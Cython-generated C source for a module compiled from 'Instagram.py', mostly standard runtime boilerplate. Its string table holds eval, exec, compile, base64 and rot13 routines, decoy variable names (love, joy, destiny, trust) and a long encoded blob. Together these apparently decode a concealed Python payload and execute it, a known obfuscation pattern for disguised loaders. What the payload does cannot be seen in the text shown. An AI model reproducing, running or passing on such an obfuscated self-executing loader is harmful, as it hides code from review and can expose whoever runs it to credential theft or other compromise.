    } __Pyx_PyAsyncMethodsStruct;
#endif

#if defined(WIN32) || defined(MS_WINDOWS)
  #define _USE_MATH_DEFINES
#endif
#include <math.h>
#ifdef NAN
#define __PYX_NAN() ((float) NAN)
#else
static CYTHON_INLINE float __PYX_NAN() {
  float value;
  memset(&value, 0xFF, sizeof(value));
  return value;
}
#endif
#if defined(__CYGWIN__) && defined(_LDBL_EQ_DBL)
#define __Pyx_truncl trunc
#else
#define __Pyx_truncl truncl
#endif

#define __PYX_MARK_ERR_POS(f_index, lineno) \
    { __pyx_filename = __pyx_f[f_index]; (void)__pyx_filename; __pyx_lineno = lineno; (void)__pyx_lineno; __pyx_clineno = __LINE__; (void)__pyx_clineno; }
#define __PYX_ERR(f_index, lineno, Ln_error) \
    { __PYX_MARK_ERR_POS(f_index, lineno) goto Ln_error; }

#ifndef __PYX_EXTERN_C
  #ifdef __cplusplus
    #define __PYX_EXTERN_C extern "C"
  #else
    #define __PYX_EXTERN_C extern
  #endif
#endif

#define __PYX_HAVE__Instagram
#define __PYX_HAVE_API__Instagram
/* Early includes */
#ifdef _OPENMP
#include <omp.h>
#endif /* _OPENMP */

#if defined(PYREX_WITHOUT_ASSERTIONS) && !defined(CYTHON_WITHOUT_ASSERTIONS)
#define CYTHON_WITHOUT_ASSERTIONS
#endif

typedef struct {PyObject **p; const char *s; const Py_ssize_t n; const char* encoding;
                const char is_unicode; const char is_str; const char intern; } __Pyx_StringTabEntry;

#define __PYX_DEFAULT_STRING_ENCODING_IS_ASCII 0
#define __PYX_DEFAULT_STRING_ENCODING_IS_UTF8 0
#define __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT (PY_MAJOR_VERSION >= 3 && __PYX_DEFAULT_STRING_ENCODING_IS_UTF8)
#define __PYX_DEFAULT_STRING_ENCODING ""
#define __Pyx_PyObject_FromString __Pyx_PyBytes_FromString
#define __Pyx_PyObject_FromStringAndSize __Pyx_PyBytes_FromStringAndSize
#define __Pyx_uchar_cast(c) ((unsigned char)c)
#define __Pyx_long_cast(x) ((long)x)
#define __Pyx_fits_Py_ssize_t(v, type, is_signed)  (\
    (sizeof(type) < sizeof(Py_ssize_t))  ||\
    (sizeof(type) > sizeof(Py_ssize_t) &&\
          likely(v < (type)PY_SSIZE_T_MAX ||\
                 v == (type)PY_SSIZE_T_MAX)  &&\
          (!is_signed || likely(v > (type)PY_SSIZE_T_MIN ||\
                                v == (type)PY_SSIZE_T_MIN)))  ||\
    (sizeof(type) == sizeof(Py_ssize_t) &&\
          (is_signed || likely(v < (type)PY_SSIZE_T_MAX ||\
                               v == (type)PY_SSIZE_T_MAX)))  )
static CYTHON_INLINE int __Pyx_is_valid_index(Py_ssize_t i, Py_ssize_t limit) {
    return (size_t) i < (size_t) limit;
}
#if defined (__cplusplus) && __cplusplus >= 201103L
    #include <cstdlib>
    #define __Pyx_sst_abs(value) std::abs(value)
#elif SIZEOF_INT >= SIZEOF_SIZE_T
    #define __Pyx_sst_abs(value) abs(value)
#elif SIZEOF_LONG >= SIZEOF_SIZE_T
    #define __Pyx_sst_abs(value) labs(value)
#elif defined (_MSC_VER)
    #define __Pyx_sst_abs(value) ((Py_ssize_t)_abs64(value))
#elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define __Pyx_sst_abs(value) llabs(value)
#elif defined (__GNUC__)
    #define __Pyx_sst_abs(value) __builtin_llabs(value)
#else
    #define __Pyx_sst_abs(value) ((value<0) ? -value : value)
#endif
static CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject*);
static CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject*, Py_ssize_t* length);
#define __Pyx_PyByteArray_FromString(s) PyByteArray_FromStringAndSize((const char*)s, strlen((const char*)s))
#define __Pyx_PyByteArray_FromStringAndSize(s, l) PyByteArray_FromStringAndSize((const char*)s, l)
#define __Pyx_PyBytes_FromString        PyBytes_FromString
#define __Pyx_PyBytes_FromStringAndSize PyBytes_FromStringAndSize
static CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char*);
#if PY_MAJOR_VERSION < 3
    #define __Pyx_PyStr_FromString        __Pyx_PyBytes_FromString
    #define __Pyx_PyStr_FromStringAndSize __Pyx_PyBytes_FromStringAndSize
#else
    #define __Pyx_PyStr_FromString        __Pyx_PyUnicode_FromString
    #define __Pyx_PyStr_FromStringAndSize __Pyx_PyUnicode_FromStringAndSize
#endif
#define __Pyx_PyBytes_AsWritableString(s)     ((char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsWritableSString(s)    ((signed char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsWritableUString(s)    ((unsigned char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsString(s)     ((const char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsSString(s)    ((const signed char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsUString(s)    ((const unsigned char*) PyBytes_AS_STRING(s))
#define __Pyx_PyObject_AsWritableString(s)    ((char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsWritableSString(s)    ((signed char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsWritableUString(s)    ((unsigned char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsSString(s)    ((const signed char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsUString(s)    ((const unsigned char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_FromCString(s)  __Pyx_PyObject_FromString((const char*)s)
#define __Pyx_PyBytes_FromCString(s)   __Pyx_PyBytes_FromString((const char*)s)
#define __Pyx_PyByteArray_FromCString(s)   __Pyx_PyByteArray_FromString((const char*)s)
#define __Pyx_PyStr_FromCString(s)     __Pyx_PyStr_FromString((const char*)s)
#define __Pyx_PyUnicode_FromCString(s) __Pyx_PyUnicode_FromString((const char*)s)
static CYTHON_INLINE size_t __Pyx_Py_UNICODE_strlen(const Py_UNICODE *u) {
    const Py_UNICODE *u_end = u;
    while (*u_end++) ;
    return (size_t)(u_end - u - 1);
}
#define __Pyx_PyUnicode_FromUnicode(u)       PyUnicode_FromUnicode(u, __Pyx_Py_UNICODE_strlen(u))
#define __Pyx_PyUnicode_FromUnicodeAndLength PyUnicode_FromUnicode
#define __Pyx_PyUnicode_AsUnicode            PyUnicode_AsUnicode
#define __Pyx_NewRef(obj) (Py_INCREF(obj), obj)
#define __Pyx_Owned_Py_None(b) __Pyx_NewRef(Py_None)
static CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b);
static CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject*);
static CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject*);
static CYTHON_INLINE PyObject* __Pyx_PyNumber_IntOrLong(PyObject* x);
#define __Pyx_PySequence_Tuple(obj)\
    (likely(PyTuple_CheckExact(obj)) ? __Pyx_NewRef(obj) : PySequence_Tuple(obj))
static CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject*);
static CYTHON_INLINE PyObject * __Pyx_PyInt_FromSize_t(size_t);
static CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject*);
#if CYTHON_ASSUME_SAFE_MACROS
#define __pyx_PyFloat_AsDouble(x) (PyFloat_CheckExact(x) ? PyFloat_AS_DOUBLE(x) : PyFloat_AsDouble(x))
#else
#define __pyx_PyFloat_AsDouble(x) PyFloat_AsDouble(x)
#endif
#define __pyx_PyFloat_AsFloat(x) ((float) __pyx_PyFloat_AsDouble(x))
#if PY_MAJOR_VERSION >= 3
#define __Pyx_PyNumber_Int(x) (PyLong_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Long(x))
#else
#define __Pyx_PyNumber_Int(x) (PyInt_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Int(x))
#endif
#define __Pyx_PyNumber_Float(x) (PyFloat_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Float(x))
#if PY_MAJOR_VERSION < 3 && __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
static int __Pyx_sys_getdefaultencoding_not_ascii;
static int __Pyx_init_sys_getdefaultencoding_params(void) {
    PyObject* sys;
    PyObject* default_encoding = NULL;
    PyObject* ascii_chars_u = NULL;
    PyObject* ascii_chars_b = NULL;
    const char* default_encoding_c;
    sys = PyImport_ImportModule("sys");
    if (!sys) goto bad;
    default_encoding = PyObject_CallMethod(sys, (char*) "getdefaultencoding", NULL);
    Py_DECREF(sys);
    if (!default_encoding) goto bad;
    default_encoding_c = PyBytes_AsString(default_encoding);
    if (!default_encoding_c) goto bad;
    if (strcmp(default_encoding_c, "ascii") == 0) {
        __Pyx_sys_getdefaultencoding_not_ascii = 0;
    } else {
        char ascii_chars[128];
        int c;
        for (c = 0; c < 128; c++) {
            ascii_chars[c] = c;
        }
        __Pyx_sys_getdefaultencoding_not_ascii = 1;
        ascii_chars_u = PyUnicode_DecodeASCII(ascii_chars, 128, NULL);
        if (!ascii_chars_u) goto bad;
        ascii_chars_b = PyUnicode_AsEncodedString(ascii_chars_u, default_encoding_c, NULL);
        if (!ascii_chars_b || !PyBytes_Check(ascii_chars_b) || memcmp(ascii_chars, PyBytes_AS_STRING(ascii_chars_b), 128) != 0) {
            PyErr_Format(
                PyExc_ValueError,
                "This module compiled with c_string_encoding=ascii, but default encoding '%.200s' is not a superset of ascii.",
                default_encoding_c);
            goto bad;
        }
        Py_DECREF(ascii_chars_u);
        Py_DECREF(ascii_chars_b);
    }
    Py_DECREF(default_encoding);
    return 0;
bad:
    Py_XDECREF(default_encoding);
    Py_XDECREF(ascii_chars_u);
    Py_XDECREF(ascii_chars_b);
    return -1;
}
#endif
#if __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT && PY_MAJOR_VERSION >= 3
#define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_DecodeUTF8(c_str, size, NULL)
#else
#define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_Decode(c_str, size, __PYX_DEFAULT_STRING_ENCODING, NULL)
#if __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
static char* __PYX_DEFAULT_STRING_ENCODING;
static int __Pyx_init_sys_getdefaultencoding_params(void) {
    PyObject* sys;
    PyObject* default_encoding = NULL;
    char* default_encoding_c;
    sys = PyImport_ImportModule("sys");
    if (!sys) goto bad;
    default_encoding = PyObject_CallMethod(sys, (char*) (const char*) "getdefaultencoding", NULL);
    Py_DECREF(sys);
    if (!default_encoding) goto bad;
    default_encoding_c = PyBytes_AsString(default_encoding);
    if (!default_encoding_c) goto bad;
    __PYX_DEFAULT_STRING_ENCODING = (char*) malloc(strlen(default_encoding_c) + 1);
    if (!__PYX_DEFAULT_STRING_ENCODING) goto bad;
    strcpy(__PYX_DEFAULT_STRING_ENCODING, default_encoding_c);
    Py_DECREF(default_encoding);
    return 0;
bad:
    Py_XDECREF(default_encoding);
    return -1;
}
#endif
#endif


/* Test for GCC > 2.95 */
#if defined(__GNUC__)     && (__GNUC__ > 2 || (__GNUC__ == 2 && (__GNUC_MINOR__ > 95)))
  #define likely(x)   __builtin_expect(!!(x), 1)
  #define unlikely(x) __builtin_expect(!!(x), 0)
#else /* !__GNUC__ or GCC < 2.95 */
  #define likely(x)   (x)
  #define unlikely(x) (x)
#endif /* __GNUC__ */
static CYTHON_INLINE void __Pyx_pretend_to_initialize(void* ptr) { (void)ptr; }

static PyObject *__pyx_m = NULL;
static PyObject *__pyx_d;
static PyObject *__pyx_b;
static PyObject *__pyx_cython_runtime = NULL;
static PyObject *__pyx_empty_tuple;
static PyObject *__pyx_empty_bytes;
static PyObject *__pyx_empty_unicode;
static int __pyx_lineno;
static int __pyx_clineno = 0;
static const char * __pyx_cfilenm= __FILE__;
static const char *__pyx_filename;


static const char *__pyx_f[] = {
  "Instagram.py",
};

/*--- Type declarations ---*/

/* --- Runtime support code (head) --- */
/* Refnanny.proto */
#ifndef CYTHON_REFNANNY
  #define CYTHON_REFNANNY 0
#endif
#if CYTHON_REFNANNY
  typedef struct {
    void (*INCREF)(void*, PyObject*, int);
    void (*DECREF)(void*, PyObject*, int);
    void (*GOTREF)(void*, PyObject*, int);
    void (*GIVEREF)(void*, PyObject*, int);
    void* (*SetupContext)(const char*, int, const char*);
    void (*FinishContext)(void**);
  } __Pyx_RefNannyAPIStruct;
  static __Pyx_RefNannyAPIStruct *__Pyx_RefNanny = NULL;
  static __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname);
  #define __Pyx_RefNannyDeclarations void *__pyx_refnanny = NULL;
#ifdef WITH_THREAD
  #define __Pyx_RefNannySetupContext(name, acquire_gil)\
          if (acquire_gil) {\
              PyGILState_STATE __pyx_gilstate_save = PyGILState_Ensure();\
              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__);\
              PyGILState_Release(__pyx_gilstate_save);\
          } else {\
              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__);\
          }
#else
  #define __Pyx_RefNannySetupContext(name, acquire_gil)\
          __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__)
#endif
  #define __Pyx_RefNannyFinishContext()\
          __Pyx_RefNanny->FinishContext(&__pyx_refnanny)
  #define __Pyx_INCREF(r)  __Pyx_RefNanny->INCREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_DECREF(r)  __Pyx_RefNanny->DECREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_GOTREF(r)  __Pyx_RefNanny->GOTREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_GIVEREF(r) __Pyx_RefNanny->GIVEREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_XINCREF(r)  do { if((r) != NULL) {__Pyx_INCREF(r); }} while(0)
  #define __Pyx_XDECREF(r)  do { if((r) != NULL) {__Pyx_DECREF(r); }} while(0)
  #define __Pyx_XGOTREF(r)  do { if((r) != NULL) {__Pyx_GOTREF(r); }} while(0)
  #define __Pyx_XGIVEREF(r) do { if((r) != NULL) {__Pyx_GIVEREF(r);}} while(0)
#else
  #define __Pyx_RefNannyDeclarations
  #define __Pyx_RefNannySetupContext(name, acquire_gil)
  #define __Pyx_RefNannyFinishContext()
  #define __Pyx_INCREF(r) Py_INCREF(r)
  #define __Pyx_DECREF(r) Py_DECREF(r)
  #define __Pyx_GOTREF(r)
  #define __Pyx_GIVEREF(r)
  #define __Pyx_XINCREF(r) Py_XINCREF(r)
  #define __Pyx_XDECREF(r) Py_XDECREF(r)
  #define __Pyx_XGOTREF(r)
  #define __Pyx_XGIVEREF(r)
#endif
#define __Pyx_XDECREF_SET(r, v) do {\
        PyObject *tmp = (PyObject *) r;\
        r = v; __Pyx_XDECREF(tmp);\
    } while (0)
#define __Pyx_DECREF_SET(r, v) do {\
        PyObject *tmp = (PyObject *) r;\
        r = v; __Pyx_DECREF(tmp);\
    } while (0)
#define __Pyx_CLEAR(r)    do { PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);} while(0)
#define __Pyx_XCLEAR(r)   do { if((r) != NULL) {PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);}} while(0)

/* PyObjectGetAttrStr.proto */
#if CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name);
#else
#define __Pyx_PyObject_GetAttrStr(o,n) PyObject_GetAttr(o,n)
#endif

/* GetBuiltinName.proto */
static PyObject *__Pyx_GetBuiltinName(PyObject *name);

/* Import.proto */
static PyObject *__Pyx_Import(PyObject *name, PyObject *from_list, int level);

/* PyObjectCall.proto */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject *func, PyObject *arg, PyObject *kw);
#else
#define __Pyx_PyObject_Call(func, arg, kw) PyObject_Call(func, arg, kw)
#endif

/* PyDictVersioning.proto */
#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS
#define __PYX_DICT_VERSION_INIT  ((PY_UINT64_T) -1)
#define __PYX_GET_DICT_VERSION(dict)  (((PyDictObject*)(dict))->ma_version_tag)
#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)\
    (version_var) = __PYX_GET_DICT_VERSION(dict);\
    (cache_var) = (value);
#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP) {\
    static PY_UINT64_T __pyx_dict_version = 0;\
    static PyObject *__pyx_dict_cached_value = NULL;\
    if (likely(__PYX_GET_DICT_VERSION(DICT) == __pyx_dict_version)) {\
        (VAR) = __pyx_dict_cached_value;\
    } else {\
        (VAR) = __pyx_dict_cached_value = (LOOKUP);\
        __pyx_dict_version = __PYX_GET_DICT_VERSION(DICT);\
    }\
}
static CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj);
static CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj);
static CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version);
#else
#define __PYX_GET_DICT_VERSION(dict)  (0)
#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)
#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP)  (VAR) = (LOOKUP);
#endif

/* GetModuleGlobalName.proto */
#if CYTHON_USE_DICT_VERSIONS
#define __Pyx_GetModuleGlobalName(var, name)  {\
    static PY_UINT64_T __pyx_dict_version = 0;\
    static PyObject *__pyx_dict_cached_value = NULL;\
    (var) = (likely(__pyx_dict_version == __PYX_GET_DICT_VERSION(__pyx_d))) ?\
        (likely(__pyx_dict_cached_value) ? __Pyx_NewRef(__pyx_dict_cached_value) : __Pyx_GetBuiltinName(name)) :\
        __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\
}
#define __Pyx_GetModuleGlobalNameUncached(var, name)  {\
    PY_UINT64_T __pyx_dict_version;\
    PyObject *__pyx_dict_cached_value;\
    (var) = __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\
}
static PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_version, PyObject **dict_cached_value);
#else
#define __Pyx_GetModuleGlobalName(var, name)  (var) = __Pyx__GetModuleGlobalName(name)
#define __Pyx_GetModuleGlobalNameUncached(var, name)  (var) = __Pyx__GetModuleGlobalName(name)
static CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name);
#endif

/* PyCFunctionFastCall.proto */
#if CYTHON_FAST_PYCCALL
static CYTHON_INLINE PyObject *__Pyx_PyCFunction_FastCall(PyObject *func, PyObject **args, Py_ssize_t nargs);
#else
#define __Pyx_PyCFunction_FastCall(func, args, nargs)  (assert(0), NULL)
#endif

/* PyFunctionFastCall.proto */
#if CYTHON_FAST_PYCALL
#define __Pyx_PyFunction_FastCall(func, args, nargs)\
    __Pyx_PyFunction_FastCallDict((func), (args), (nargs), NULL)
#if 1 || PY_VERSION_HEX < 0x030600B1
static PyObject *__Pyx_PyFunction_FastCallDict(PyObject *func, PyObject **args, Py_ssize_t nargs, PyObject *kwargs);
#else
#define __Pyx_PyFunction_FastCallDict(func, args, nargs, kwargs) _PyFunction_FastCallDict(func, args, nargs, kwargs)
#endif
#define __Pyx_BUILD_ASSERT_EXPR(cond)\
    (sizeof(char [1 - 2*!(cond)]) - 1)
#ifndef Py_MEMBER_SIZE
#define Py_MEMBER_SIZE(type, member) sizeof(((type *)0)->member)
#endif
#if CYTHON_FAST_PYCALL
  static size_t __pyx_pyframe_localsplus_offset = 0;
  #include "frameobject.h"
  #define __Pxy_PyFrame_Initialize_Offsets()\
    ((void)__Pyx_BUILD_ASSERT_EXPR(sizeof(PyFrameObject) == offsetof(PyFrameObject, f_localsplus) + Py_MEMBER_SIZE(PyFrameObject, f_localsplus)),\
     (void)(__pyx_pyframe_localsplus_offset = ((size_t)PyFrame_Type.tp_basicsize) - Py_MEMBER_SIZE(PyFrameObject, f_localsplus)))
  #define __Pyx_PyFrame_GetLocalsplus(frame)\
    (assert(__pyx_pyframe_localsplus_offset), (PyObject **)(((char *)(frame)) + __pyx_pyframe_localsplus_offset))
#endif // CYTHON_FAST_PYCALL
#endif

/* PyObjectCallMethO.proto */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallMethO(PyObject *func, PyObject *arg);
#endif

/* PyObjectCallOneArg.proto */
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, PyObject *arg);

/* PyThreadStateGet.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyThreadState_declare  PyThreadState *__pyx_tstate;
#define __Pyx_PyThreadState_assign  __pyx_tstate = __Pyx_PyThreadState_Current;
#define __Pyx_PyErr_Occurred()  __pyx_tstate->curexc_type
#else
#define __Pyx_PyThreadState_declare
#define __Pyx_PyThreadState_assign
#define __Pyx_PyErr_Occurred()  PyErr_Occurred()
#endif

/* PyErrFetchRestore.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyErr_Clear() __Pyx_ErrRestore(NULL, NULL, NULL)
#define __Pyx_ErrRestoreWithState(type, value, tb)  __Pyx_ErrRestoreInState(PyThreadState_GET(), type, value, tb)
#define __Pyx_ErrFetchWithState(type, value, tb)    __Pyx_ErrFetchInState(PyThreadState_GET(), type, value, tb)
#define __Pyx_ErrRestore(type, value, tb)  __Pyx_ErrRestoreInState(__pyx_tstate, type, value, tb)
#define __Pyx_ErrFetch(type, value, tb)    __Pyx_ErrFetchInState(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb);
static CYTHON_INLINE void __Pyx_ErrFetchInState(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);
#if CYTHON_COMPILING_IN_CPYTHON
#define __Pyx_PyErr_SetNone(exc) (Py_INCREF(exc), __Pyx_ErrRestore((exc), NULL, NULL))
#else
#define __Pyx_PyErr_SetNone(exc) PyErr_SetNone(exc)
#endif
#else
#define __Pyx_PyErr_Clear() PyErr_Clear()
#define __Pyx_PyErr_SetNone(exc) PyErr_SetNone(exc)
#define __Pyx_ErrRestoreWithState(type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetchWithState(type, value, tb)  PyErr_Fetch(type, value, tb)
#define __Pyx_ErrRestoreInState(tstate, type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetchInState(tstate, type, value, tb)  PyErr_Fetch(type, value, tb)
#define __Pyx_ErrRestore(type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetch(type, value, tb)  PyErr_Fetch(type, value, tb)
#endif

/* CLineInTraceback.proto */
#ifdef CYTHON_CLINE_IN_TRACEBACK
#define __Pyx_CLineForTraceback(tstate, c_line)  (((CYTHON_CLINE_IN_TRACEBACK)) ? c_line : 0)
#else
static int __Pyx_CLineForTraceback(PyThreadState *tstate, int c_line);
#endif

/* CodeObjectCache.proto */
typedef struct {
    PyCodeObject* code_object;
    int code_line;
} __Pyx_CodeObjectCacheEntry;
struct __Pyx_CodeObjectCache {
    int count;
    int max_count;
    __Pyx_CodeObjectCacheEntry* entries;
};
static struct __Pyx_CodeObjectCache __pyx_code_cache = {0,0,NULL};
static int __pyx_bisect_code_objects(__Pyx_CodeObjectCacheEntry* entries, int count, int code_line);
static PyCodeObject *__pyx_find_code_object(int code_line);
static void __pyx_insert_code_object(int code_line, PyCodeObject* code_object);

/* AddTraceback.proto */
static void __Pyx_AddTraceback(const char *funcname, int c_line,
                               int py_line, const char *filename);

/* GetAttr.proto */
static CYTHON_INLINE PyObject *__Pyx_GetAttr(PyObject *, PyObject *);

/* Globals.proto */
static PyObject* __Pyx_Globals(void);

/* GCCDiagnostics.proto */
#if defined(__GNUC__) && (__GNUC__ > 4 || (__GNUC__ == 4 && __GNUC_MINOR__ >= 6))
#define __Pyx_HAS_GCC_DIAGNOSTIC
#endif

/* CIntToPy.proto */
static CYTHON_INLINE PyObject* __Pyx_PyInt_From_long(long value);

/* CIntFromPy.proto */
static CYTHON_INLINE long __Pyx_PyInt_As_long(PyObject *);

/* CIntFromPy.proto */
static CYTHON_INLINE int __Pyx_PyInt_As_int(PyObject *);

/* FastTypeChecks.proto */
#if CYTHON_COMPILING_IN_CPYTHON
#define __Pyx_TypeCheck(obj, type) __Pyx_IsSubtype(Py_TYPE(obj), (PyTypeObject *)type)
static CYTHON_INLINE int __Pyx_IsSubtype(PyTypeObject *a, PyTypeObject *b);
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches(PyObject *err, PyObject *type);
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject *err, PyObject *type1, PyObject *type2);
#else
#define __Pyx_TypeCheck(obj, type) PyObject_TypeCheck(obj, (PyTypeObject *)type)
#define __Pyx_PyErr_GivenExceptionMatches(err, type) PyErr_GivenExceptionMatches(err, type)
#define __Pyx_PyErr_GivenExceptionMatches2(err, type1, type2) (PyErr_GivenExceptionMatches(err, type1) || PyErr_GivenExceptionMatches(err, type2))
#endif
#define __Pyx_PyException_Check(obj) __Pyx_TypeCheck(obj, PyExc_Exception)

/* CheckBinaryVersion.proto */
static int __Pyx_check_binary_version(void);

/* InitStrings.proto */
static int __Pyx_InitStrings(__Pyx_StringTabEntry *t);


/* Module declarations from 'Instagram' */
#define __Pyx_MODULE_NAME "Instagram"
extern int __pyx_module_is_main_Instagram;
int __pyx_module_is_main_Instagram = 0;

/* Implementation of 'Instagram' */
static PyObject *__pyx_builtin_eval;
static PyObject *__pyx_builtin_compile;
static const char __pyx_k_god[] = "god";
static const char __pyx_k_joy[] = "joy";
static const char __pyx_k_eval[] = "eval";
static const char __pyx_k_exec[] = "exec";
static const char __pyx_k_love[] = "love";
static const char __pyx_k_main[] = "__main__";
static const char __pyx_k_name[] = "__name__";
static const char __pyx_k_test[] = "__test__";
static const char __pyx_k_magic[] = "magic";
static const char __pyx_k_rot13[] = "rot13";
static const char __pyx_k_trust[] = "trust";
static const char __pyx_k_base64[] = "base64";
static const char __pyx_k_codecs[] = "codecs";
static const char __pyx_k_import[] = "__import__";
static const char __pyx_k_string[] = "<string>";
static const char __pyx_k_compile[] = "compile";
static const char __pyx_k_destiny[] = "destiny";
static const char __pyx_k_b64decode[] = "b64decode";
static const char __pyx_k_cline_in_traceback[] = "cline_in_traceback";
static const char __pyx_k_codecs_decode_love_joy[] = "codecs.decode(love, joy)";
static const char __pyx_k_codecs_decode_destiny_joy[] = "codecs.decode(destiny, joy)";
static const char __pyx_k_CX21THHIcX3AzrQIeX2MaDzM4nRH0pSy[] = "CX21THHIcX3AzrQIeX2MaDzM4nRH0pSyRMauGHzMjnzy3o0yxn2Sxqat2HJAyHIS1oQO4X0kCM0jeEzqGImyvHTqgLl9uqIuzMmyzE0jmLHkAIxIGqmHiIxuJGQDjA3WREv81AGAyEINiZ1uxEISdY3cRZ2yDrUACHyILYmA6nzDeEwuDDwMDnIZ2FwqbGIqdIKMaoyyEoP83LwEjGJM5ImyToSIupRkDBPgnLzD4Hv9Vqx5VrSqSrREeL01IqGuSZmWTq2teDwEDFmyinl9GESEzF0yBpJ0mAxqBZKt0BTqho1ObozAMnxqWraMRFIMUFzIgqSy6X01xpwEAGyWWITt2ImEJMSblGIIIZIScZJABrT1RHTWVGT5irwHmBHEmAKN4Z1EmIKq5MxARAwuDpREQDyZ2DFgEHQWcExx2n0gKMHuiEUbipHcRo1cinKAyGQOXX0ucBKSbGHM0L1AMAHWPLwqgqSS2p05nA2q2ATkGY0ugp2IZnmH3FTSZFxyuZ1qjnR1MMJg0ox15A2EXHwSgEmOJn25nZTLeJxIxBKSOAxyhLxI0LwqurUWKBKqInyR3I3cLpHSbozEKX1WBZaWLLKbmpJ9WAzMwBGubnmyIFz85FQOgp255qUOvF0SzrHAREGWKqxMSLKuuL1b5pz4eMGH5qyOhpJgjp0ICov9irTShqxu4Az9ABHEgoH1IqmOzHRM5MP9aHUu5DGWhMIxiHKMGHaLirzSZDKH4IGLlEHAPDacnZxqgGQEDIRuEHPgGGxSJIQZjDGN5nJ14ETyhF1AkX01mFTSyAHq6EQD1rzcOZwy6nTMZEmEjpJgOYmIKD1c6ASWbASWFpRWSq3qiG1SBMIcyM2kUG1AQBRghq01KGGulFxWEZTqEFz9kMIWlrIMSGyckI2tlrKO3oQSVrIuJEH52q1cXZSyen2x5qGWHMJcwEmqeEIx5MJgLZTL4pHEcFlgGrTE1AwZjo09lITWOHSMUp1qXIHMfIJAhAQD4Gzb1qQEAZ3uFISMFoIEcHzMhJQIJozkGMJABp1yyIx1jLKckE1xmGz1FZzIcAyOdrQt2GJ5DpHIYDIyzGTjeFR94pxD0IxyzqmyOnzEmGTS1E1cLEGSSF0qRFIZ5rIyGoHMWAKAFGx1uFIqfJKIXnzSGMHgWI05OEIqPL0ZlLaOMJHLjnRMuDIqiDzg6JFfmpzW4ASMJDzI4Dx9dq0SnrzgRLyIHnGW5Ix1hoR1mDIRkEGueqxkzHTWFI3WPnz0kGmMwI0MPZT9aDwWiHHE2pxguryM2Mz9eZKIiIH90HT9VEJMhFyuFoGORoHM6n2guLwVipaZmnUuUpQO6Ax9RF21LAycPnSMxnTESLHMYnaAGnGW3pxWwpxczZURmpayUrzc3AwWVLGSQEQ